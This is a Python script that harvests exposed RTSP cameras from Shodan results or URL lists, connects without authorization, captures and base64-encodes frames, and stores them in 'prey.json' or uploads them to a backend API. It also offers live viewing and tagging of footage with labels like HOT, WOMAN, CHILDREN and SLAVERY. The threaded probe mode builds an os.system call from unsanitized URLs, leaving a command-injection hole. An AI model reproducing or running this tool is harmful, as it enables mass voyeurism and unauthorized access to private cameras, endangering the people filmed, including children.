#!/usr/bin/python3.7
import base64
import json
import socket
from argparse import ArgumentParser, RawTextHelpFormatter
from enum import Enum
from threading import Thread

import cv2

DEFAULT_DATETIME_FORMAT = '%Y-%m-%d %H:%M:%S'
socket.setdefaulttimeout(3.0)
DEFAULT_THREAD_LIMIT = 10


def start_separate_probe_process(camera_url, import_endpoint=None):
    import os
    import sys

    if import_endpoint:
        import_endpoint = f'--import {import_endpoint}'
    else:
        import_endpoint = ''
    os.system(f'{sys.argv[0]} --url {camera_url} {import_endpoint}')


def get_arguments():
    parser = ArgumentParser(formatter_class=RawTextHelpFormatter)
    parser.add_argument('-u', '--url', dest='url',
                        help='URL to rtsp stream to view. '
                             'Should be in the following format: "rtsp://115.21.242.154:554"')
    parser.add_argument('-s', '--stream', action='store_true',
                        help='Watch the continues stream from a valid camera')
    parser.add_argument('-bj', '--batch-json', dest='batch_json_file',
                        help='Provide a new-line separated file with JSON downloaded from the Shodan API '
                             '(using command: shodan download search_query) '
                             'to lookup and retrieve working streams.')
    parser.add_argument('-bl', '--batch-list', dest='batch_list_file',
                        help='Provide a new-line separated file with rtsp url\'s to perform a batch lookup. '
                             'URL should be in the following format:"rtsp://10.10.10.10:554"')
    parser.add_argument('-o', '--output', dest='output',
                        help='Optional. Output JSON file to store the results. Default file name is "prey.json".')
    parser.add_argument('-i', '--import', dest='import_url',
                        help='Optional. The import endpoint of the backend rest API to store probed cameras.')
    parser.add_argument('-c', '--commentary', action='store_true',
                        help='Optional. Make and submit a review comment for the watched stream. '
                             'Only valid with an option --stream')
    parser.add_argument('-k', '--keywords', action='store_true',
                        help='Optional. Send specified keywords to mark your camera. A set of keywords would be '
                             'printed during camera lookup.')
    parser.add_argument('--threads',
                        dest='threads',
                        type=int,
                        required=False,
                        help='Specify a number of threads to use while probing the cameras.')
    options = parser.parse_args()
    if not options.url and not options.batch_json_file and not options.batch_list_file:
        parser.error('URL to the RTSP stream or a batch json/list file must be specified. Use --help for more info.')
    if options.batch_json_file and options.batch_list_file:
        parser.error('You can not provide a batch json file and a batch list file both. Choose something.')
    if not options.output:
        options.output = 'prey.json'
    if not options.import_url:
        print('The import endpoint was not provided, results would be written to a file.')
    if options.commentary and not options.url and not options.stream:
        parser.error('You can not specify an option for the stream review without a --stream option')
    return options


class RtspClient:
    def __init__(self, output_file, import_endpoint=None, do_review_comment=False, use_keywords=False):
        self.camera_reader = None
        self.output_file = output_file
        self.import_endpoint = import_endpoint
        self.do_review_comment = do_review_comment
        self.use_keywords = use_keywords


    class Target:
        class Keyword(Enum):
            HOT = 0,
            WOMAN = 1,
            MAN = 2,
            CHILDREN = 3,
            CREEPY = 4,
            AUTISTIC = 5,
            SLAVERY = 6


        class CameraStatus(Enum):
            UNCONNECTED = 0,
            NOT_FOUND = 1,
            UNAUTHORIZED = 2,
            OPEN = 3


        def __init__(self, url, ip=None, port=None, country_name=None, isp=None, country_code=None,
                     city=None, comment=None):
            self.url = url
            self.ip = ip
            self.port = port
            self.country_name = country_name
            self.isp = isp
            self.country_code = country_code
            self.city = city
            self.status = self.CameraStatus.UNCONNECTED
            self.comment = comment
            self.keywords = set()
            self.base64_image_data = None

        def print_all_keywords(self):
            print('Available keywords:')
            for k in self.Keyword:
                print(k.name)

        def to_dict(self):
            target = \
                {
                    'url': self.url,
                    'status': self.status.name,
                    'countryCode': self.country_code,
                    'countryName': self.country_name,
                    'comment': self.comment,
                    'keywords': list(self.keywords),
                    'city': self.city,
                    'isp': self.isp,
                    'base64ImageData': self.base64_image_data
                }
            return target


    def batch_json(self, batch_json_file):
        cameras_to_lookup = []
        with open(batch_json_file, 'r', encoding='utf-8') as batch_json:
            targets = [line.replace('\n', '') for line in batch_json.readlines()]
            for target in targets:
                res = json.loads(target)
                ip_camera = RtspClient.Target(
                            url=f'rtsp://{res["ip_str"]}:{res["port"]}',
                            ip=res['ip_str'],
                            port=res['port'],
                            isp=res['isp'],
                            country_name=res['location']['country_name'],
                            country_code=res['location']['country_code'],
                            city=res['location']['city'])
                cameras_to_lookup.append(ip_camera)
        return cameras_to_lookup

    def batch_list(self, batch_list_file):
        cameras_to_lookup = []
        with open(batch_list_file, 'r', encoding='utf-8') as batch_json:
            targets = [line.replace('\n', '') for line in batch_json.readlines()]
            for target in targets:
                ip = target.split('://')[1].split(':')[0]
                port = target.split('://')[1].split(':')[1]
                ip_camera = RtspClient.Target(
                            url=target,
                            ip=ip,
                            port=port,
                            isp=None,
                            country_name=None,
                            country_code=None,
                            city=None)
                cameras_to_lookup.append(ip_camera)
        return cameras_to_lookup

    def do_connect(self, target, stream=False):
        url = target.url
        self.camera_reader = cv2.VideoCapture(url)
        is_connected, frame = self.camera_reader.read()
        if is_connected:
            print(f'Connected to {url}.')

            # convert the captured frame to a base64 string
            cv2.imwrite('capture.jpg', frame)
            with open("capture.jpg", "rb") as image_file:
                target.base64_image_data = base64.b64encode(image_file.read()).decode('utf-8')

            target.status = target.CameraStatus.OPEN
            if stream:
                print('Starting stream...')
                while True:
                    is_connected, frame = self.camera_reader.read()
                    if is_connected:
                        cv2.imshow("View", frame)

                    pressed_key = cv2.waitKey(1)
                    if pressed_key & 0xFF == ord("q"):  # Exit condition
                        break
                if self.do_review_comment:
                    print('How was that?')
                    target.comment = input('>>')
                if self.use_keywords:
                    target.print_all_keywords()
                    print('\nMARK THIS SHIT:')
                    k = input('>>')
                    if ',' not in k:
                        target.keywords.add(k)
                    else:
                        target.keywords.update(k.split(','))
        else:
            print(f'Connection failed to {url}.')

    def lookup(self, target, stream=False):
        self.do_connect(target, stream)
        self.dump(target)
        if self.import_endpoint:
            self.send(target)

    def dump(self, target):
        print(f'Storing {target.url} / {target.status.name}')
        with open(self.output_file, 'a', encoding='utf-8') as f:
            json.dump(target.to_dict(), f)
            f.write('\n')

    def send(self, target):
        try:
            import requests

            session = requests.Session()
            response = session.put(url=self.import_endpoint,
                                   json=target.to_dict(),
                                   headers={
                                       "Content-Type": "application/json"
                                   })
            if response.ok:
                print(f'Camera [{target.url}] has been imported to the backend API')
        except Exception as e:
            if 'refused' in str(e):
                print('Backend API is not responding. Is there a reachable server?')
            else:
                print(f'Unexpected error while communication with the API: {e}')


options = get_arguments()
import_endpoint = options.import_url

threads_limit = options.threads

rtsp_client = RtspClient(
            options.output,
            import_endpoint=import_endpoint,
            do_review_comment=options.commentary,
            use_keywords=options.keywords)
if not options.url:
    cameras_to_lookup = []
    if options.batch_json_file:
        cameras_to_lookup = rtsp_client.batch_json(options.batch_json_file)
    if options.batch_list_file:
        cameras_to_lookup = rtsp_client.batch_list(options.batch_list_file)
    if cameras_to_lookup:
        if options.threads:
            threads_limit = options.threads

            probe_threads = []

            for camera in cameras_to_lookup:
                while len(probe_threads) >= threads_limit:
                    for thread in probe_threads.copy():
                        if not thread.is_alive():
                            probe_threads.remove(thread)

                probe_thread = Thread(target=start_separate_probe_process,
                                      args=(camera.url, import_endpoint))
                probe_threads.append(probe_thread)
                probe_thread.start()
            while any(thread.is_alive() for thread in probe_threads):
                pass
        else:
            for camera in cameras_to_lookup:
                rtsp_client.lookup(camera)

else:
    rtsp_client.lookup(RtspClient.Target(url=options.url), stream=options.stream)
